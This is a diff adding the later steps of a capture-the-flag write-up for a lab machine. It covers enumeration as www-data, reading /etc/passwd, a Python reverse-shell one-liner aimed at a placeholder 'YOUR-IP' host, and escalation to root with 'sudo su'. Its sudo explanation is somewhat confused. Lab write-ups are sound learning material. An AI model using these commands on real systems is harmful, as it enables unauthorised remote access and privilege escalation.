@@ -137,3 +137,132 @@ so i tried reading the file with
 less /home/rick/second\ ingredients
 
 And i was able to get the answer of 2nd quesiton.
+
+
+For the 3rd question i need to go on to the rev shell or somehow get the shell.
+
+So now its time to go into the full detective mode and full roaming here and there now i did first few command command and gets the output
+
+- id > uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+- whoami > www-data
+
+- hostname > ip-10-48-164-33
+
+- uname -a > Linux ip-10-48-164-33 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+
+- cat /etc/passwd  >root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+landscape:x:103:105::/var/lib/landscape:/usr/sbin/nologin
+tss:x:112:119:TPM software stack,,,:/var/lib/tpm:/bin/false
+tcpdump:x:113:120::/nonexistent:/usr/sbin/nologin
+fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+- cat /etc/crontab > # |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+These are the few result now after analyzing the crontab it is nothing much of our interest.
+
+But after inspecting the file /etc/passwd
+
+We got confirm that there are 2 users one is ubuntu and one is rick.
+
+Next i checked that at which location i am peremitted to write with the command
+
+- find / -writable -type d 2>/dev/null
+
+and the ouput was 
+
+```bash
+/proc/1482/task/1482/fd
+/proc/1482/fd
+/proc/1482/map_files
+/tmp
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/tmp
+/var/lib/lxcfs/proc
+/var/lib/lxcfs/sys
+/var/lib/lxcfs/sys/devices
+/var/lib/lxcfs/sys/devices/system
+/var/lib/lxcfs/sys/devices/system/cpu
+/var/lib/lxcfs/cgroup
+/var/lib/php/sessions
+/run/screen
+/run/php
+/run/cloud-init/tmp
+/run/lock
+/run/lock/apache2
+/home/rick
+/dev/mqueue
+/dev/shm
+```
+
+Interested locations were /tmp & /dev/shm
+
+
+And inside the location /home/rick there was only 1 file that contained the answer of q2.
+
+And after it all with the commadn
+
+```bash
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+I was able to get the revshell.
+
+Intentinally or unintenally i was chekcing for misconfigured binaries with sudo -l and it doesn't gave me any such binary so i tried anything else that is
+
+- sudo su
+
+Now after it i somehow got the root access.
+
+After doing a little research i heard that if content after the execution of command sudo -l is
+
+Matching Defaults entries for root on ip-10-48-164-33: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User root may run the following commands on ip-10-48-164-33: (ALL : ALL) ALL
+
+Then if i am authenticated as that account (or already are root), I can get an interactive root shell with either:
+
+sudo su
+
+or:
+
+sudo -i
+
+Now after getting the root access i am able to read the 3rd question answer in the file
+
+/root/3rd.txt
